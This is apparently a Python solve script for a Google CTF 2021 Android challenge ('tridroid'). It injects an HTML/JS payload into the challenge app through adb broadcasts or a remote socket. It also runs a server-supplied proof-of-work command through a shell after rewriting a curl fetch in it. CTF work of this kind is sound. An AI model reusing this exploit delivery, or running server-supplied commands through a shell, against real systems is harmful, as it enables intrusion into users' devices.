import base64
import subprocess
from base64 import b64encode
import sys

def adb(args, capture_output=True):
    return subprocess.check_output(
        "adb {}".format(" ".join(args)).split()
    ).decode()

def adb_activity(activity):
    adb(["shell", "am", "start", "-W", "-n", activity])

def adb_broadcast(action, extras=None):
    args = ["shell", "am", "broadcast", "-a", action]
    if extras:
        for key in extras:
            args += ["-e", key, extras[key]]
    return adb(args)

with open("solve.html", "rb") as f:
    HTML = f.read()

with open("solve.js", "rb") as f:
    JS = f.read()

payload = HTML.replace(b"REPLACEME", b64encode(JS))

from cpwn import *

if args.REMOTE:
    payload = b64encode(payload)
    r = remote("tridroid.2021.ctfcompetition.com", 1337)
    def solve_pow():
        r.recvuntil("with:\n")
        prob = r.recvline().strip().decode().replace("<(curl -sSL https://goo.gle/kctf-pow)", "/tmp/pow.py")
        log.info("Trying to solve: {}".format(prob))
        answer = subprocess.check_output(prob, shell=True, stderr=None).strip()
        log.info("Found PoW solution: {}".format(answer))
        r.sendlineafter("Solution? ", answer)
    solve_pow()
    r.recvuntil("Please enter your name encoded in base64:\n")
    r.sendline(payload)
    r.interactive()
    exit()

if args.RESTART:
    try:
        subprocess.check_call(["sh", "-c", "adb shell ps | grep com.google.ctf.pwn.tridroid | awk '{print $2}' | xargs adb shell su -0 kill"])
    except:
        pass
    adb_activity("com.google.ctf.pwn.tridroid/.MainActivity")

import time
time.sleep(2)

print(adb_broadcast("com.google.ctf.pwn.tridroid.SET_NAME", extras={
    "data": b64encode(payload).decode()
}))
